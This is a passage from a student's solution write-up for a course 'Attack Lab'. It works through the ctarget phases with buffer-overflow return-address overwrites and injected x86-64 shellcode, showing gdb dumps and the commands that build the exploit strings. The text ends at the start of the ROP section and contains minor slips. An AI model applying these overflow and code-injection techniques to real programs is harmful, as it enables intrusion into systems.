# Solutions for Attack-Lab.


## Get Ready

### Disassemble Targets

~~~
objdump -d ctarget > dumps/ctarget.txt
~~~

~~~
objdump -d rtarget > dump/rtarget.txt
~~~

### Compile and Disassemble farm.c

~~~
gcc -c farm.c -Og
~~~

~~~
objdump -d farm.o > dumps/farm.txt
~~~


## Solve: ctarget

`ctarget` has some code-injection vulnerabilities.

It consists of three phases: touch1, touch2 and touch2.

We need to call them with right parameters by replacing return address stored in stack.

### Touch1

~~~
(gdb) call touch1
$2 = {void ()} 0x40195b <touch1>
~~~

Touch1 is at 0x40195b, takes no parameter and returns nothing.

We can call it in `test()`.

~~~
0000000000401b06 <test>:
  401b06:       48 83 ec 08             sub    $0x8,%rsp
  401b0a:       b8 00 00 00 00          mov    $0x0,%eax
  401b0f:       e8 31 fe ff ff          callq  401945 <getbuf>
  401b14:       89 c2                   mov    %eax,%edx
  401b16:       be 48 33 40 00          mov    $0x403348,%esi
  401b1b:       bf 01 00 00 00          mov    $0x1,%edi
  401b20:       b8 00 00 00 00          mov    $0x0,%eax
  401b25:       e8 d6 f2 ff ff          callq  400e00 <__printf_chk@plt>
  401b2a:       48 83 c4 08             add    $0x8,%rsp
  401b2e:       c3                      retq
~~~

It calls `getbuf()`.

~~~
0000000000401945 <getbuf>:
  401945:       48 83 ec 38             sub    $0x38,%rsp
  401949:       48 89 e7                mov    %rsp,%rdi
  40194c:       e8 7e 02 00 00          callq  401bcf <Gets>
  401951:       b8 01 00 00 00          mov    $0x1,%eax
  401956:       48 83 c4 38             add    $0x38,%rsp
  40195a:       c3                      retq
~~~

At 0x401949, stack looks like:

~~~
(gdb) x/32wx $rsp
0x55672c78:	0x00000000	0x00000000	0x00000000	0x00000000
0x55672c88:	0x00000000	0x00000000	0x00000000	0x00000000
0x55672c98:	0x00000000	0x00000000	0x00000000	0x00000000
0x55672ca8:	0x55586000	0x00000000	0x00401b14	0x00000000
0x55672cb8:	0x00000002	0x00000000	0x004020ab	0x00000000
0x55672cc8:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
0x55672cd8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x55672ce8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
~~~

We see `0x00401b14`, which is the return address.

We want it to be `0x0040195b`, the address of `touch1()`.

There are 56 bytes of padding before the return address.

We can assume that the size of the buffer is 56.

It accepts only character, so we need to consider endian.

~~~
0x55672cb0:	0x14	0x1b	0x40	0x00	0x00	0x00	0x00	0x00
~~~

The address `0x00401b14` in little endian.

Therefore, `0x0040195b` shell be `0x5b 0x19 0x40`.

Now, generate the string:

[56 padding][0x5b 0x19 0x40 in ascii]


~~~
$ printf '0%.0s' {1..56} > injection/touch1.txt

$ utils/h2r 5b 19 40 >> injection/touch1.txt
~~~

~~~
(gdb) run -q -i injection/touch1.txt
~~~

~~~
0x55672cb0:	0x5b	0x19	0x40	0x00	0x00	0x00	0x00	0x00
~~~

We got it.

### Tocuh2

We know how to call a function at specific address.

We now need to give a parameter, too.

`touch2` accepts a single parameter, `unsigned int` type, which takes 4 bytes.

~~~
0000000000401987 <touch2>:
  401987:       48 83 ec 08             sub    $0x8,%rsp
  40198b:       89 fa                   mov    %edi,%edx
  40198d:       c7 05 85 3b 20 00 02    movl   $0x2,0x203b85(%rip)        # 60551c <vlevel>
  401994:       00 00 00
  401997:       39 3d 87 3b 20 00       cmp    %edi,0x203b87(%rip)        # 605524 <cookie>
  40199d:       75 20                   jne    4019bf <touch2+0x38>
  40199f:       be a8 32 40 00          mov    $0x4032a8,%esi
  4019a4:       bf 01 00 00 00          mov    $0x1,%edi
  4019a9:       b8 00 00 00 00          mov    $0x0,%eax
  4019ae:       e8 4d f4 ff ff          callq  400e00 <__printf_chk@plt>
  4019b3:       bf 02 00 00 00          mov    $0x2,%edi
  4019b8:       e8 57 04 00 00          callq  401e14 <validate>
  4019bd:       eb 1e                   jmp    4019dd <touch2+0x56>
  4019bf:       be d0 32 40 00          mov    $0x4032d0,%esi
  4019c4:       bf 01 00 00 00          mov    $0x1,%edi
  4019c9:       b8 00 00 00 00          mov    $0x0,%eax
  4019ce:       e8 2d f4 ff ff          callq  400e00 <__printf_chk@plt>
  4019d3:       bf 02 00 00 00          mov    $0x2,%edi
  4019d8:       e8 f9 04 00 00          callq  401ed6 <fail>
  4019dd:       bf 00 00 00 00          mov    $0x0,%edi
  4019e2:       e8 69 f4 ff ff          callq  400e50 <exit@plt>
~~~

Oh, that parameter is passed by %rdi.

How do we modify register...?

Hmm...let's think.

We can use 56 bytes of stack, and we can execute that code.

We may try below:

1) Put `movl $0x5788e9e7,$edi`, `movl $0x401987,(%rsp)` and `ret`.    
This code will be excuted after 56 bytes of stack is deallocated, and new stack frame is made(after ret).
    
2) Put start address of the code above to 0x38(%rsp).

Like this!

~~~
movl    $0x5788e9e7,%edi
movl    $0x401987,(%rsp)
ret
~~~

~~~
$ gcc -c touch2_code_injection.s && objdump -d touch2_code_injection.o

touch2_code_injection.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   bf e7 e9 88 57          mov    $0x5788e9e7,%edi
   5:   c7 04 24 87 19 40 00    movl   $0x401987,(%rsp)
   c:   c3                      retq
~~~

Ooh ya, 14 bytes of evil instructions.

The start address of the injected code would be %rsp, which has constant value of `0x55672c78`! Thank god.

So the hack string is:

[bf e7 e9 88 57 c7 04 24 87 19 40 00 c3 in ascii][43 bytes of padding][78 2c 67 55 in ascii]


~~~
$ utils/h2r bf e7 e9 88 57 c7 04 24 87 19 40 00 c3 > injection/touch2.txt

$ printf '0%.0s' {1..43} >> injection/touch2.txt

$ utils/h2r 78 2c 67 55 >> injection/touch2.txt
~~~

## Solve: rtarget

`rtarget` has some return-oriented-programming vulnerabilities.
